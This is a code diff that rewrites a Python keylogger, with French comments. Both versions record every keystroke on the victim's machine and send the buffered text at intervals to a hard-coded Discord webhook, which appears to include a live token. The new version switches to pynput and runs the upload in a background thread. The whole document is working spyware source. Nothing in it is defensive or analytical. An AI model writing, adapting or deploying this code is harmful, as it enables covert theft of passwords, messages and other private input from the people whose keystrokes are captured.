@@ -1,49 +1,44 @@
-import keyboard
+import os
+import sys
+import threading
 import requests
 import time
+from pynput import keyboard
 
-# Remplace par ton webhook Discord
+# Webhook Discord ou serveur perso
 WEBHOOK_URL = "https://discord.com/api/webhooks/1353353580467458138/fvEgoFmiNhnQh1WCcJU-bDVwxXoFy5KOH4zapOXQuuMA8BrPOE4sUV3yyvplODME0jxn"
 
-log_buffer = []  # Stocke les frappes avant envoi
-SEND_INTERVAL = 60  # Temps entre chaque envoi (en secondes)
+# Stockage des frappes clavier en mémoire
+key_logs = []
 
-def send_to_discord(message):
-    """Envoie un message au webhook Discord"""
-    data = {"content": f"```{message}```"}
+# Fonction pour capturer les touches
+def on_press(key):
+    global key_logs
     try:
-        requests.post(WEBHOOK_URL, json=data)
-    except Exception as e:
-        print(f"Erreur d'envoi : {e}")
+        key_logs.append(key.char)
+    except AttributeError:
+        key_logs.append(f"[{key}]")
 
-def on_key_press(event):
-    """Capture les touches pressées et les stocke"""
-    global log_buffer
-    key = event.name
-
-    if key == "space":
-        key = " "  # Remplace "space" par un vrai espace
-    elif key == "enter":
-        key = "\n"  # Retour à la ligne
-    elif len(key) > 1:
-        key = f"[{key}]"  # Encapsule les touches spéciales
-
-    log_buffer.append(key)
-
-def send_logs_periodically():
-    """Envoie les logs à Discord à intervalle régulier"""
+# Fonction pour envoyer les logs toutes les 30 secondes
+def send_logs():
+    global key_logs
     while True:
-        if log_buffer:
-            message = "".join(log_buffer)
-            send_to_discord(message)
-            log_buffer.clear()  # Vide le buffer après envoi
-        time.sleep(SEND_INTERVAL)
+        if key_logs:  # Vérifie s'il y a du texte à envoyer
+            payload = {"content": f"```\n{''.join(key_logs)}\n```"}
+            requests.post(WEBHOOK_URL, json=payload)
+            key_logs = []  # Vide la mémoire après l'envoi
+        time.sleep(15)  # Pause de 30 secondes
 
-keyboard.on_press(on_key_press)
+# Lancer le keylogger et l'envoi des données en parallèle
+def start_logger():
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
 
-# Lance l'envoi en arrière-plan
-import threading
-threading.Thread(target=send_logs_periodically, daemon=True).start()
+    # Thread pour envoyer les logs en arrière-plan
+    log_thread = threading.Thread(target=send_logs, daemon=True)
+    log_thread.start()
 
-print("Keylogger actif... (CTRL + C pour arrêter)")
-keyboard.wait()  # Garde le programme actif
+    listener.join()
+
+if __name__ == "__main__":
+    start_logger()
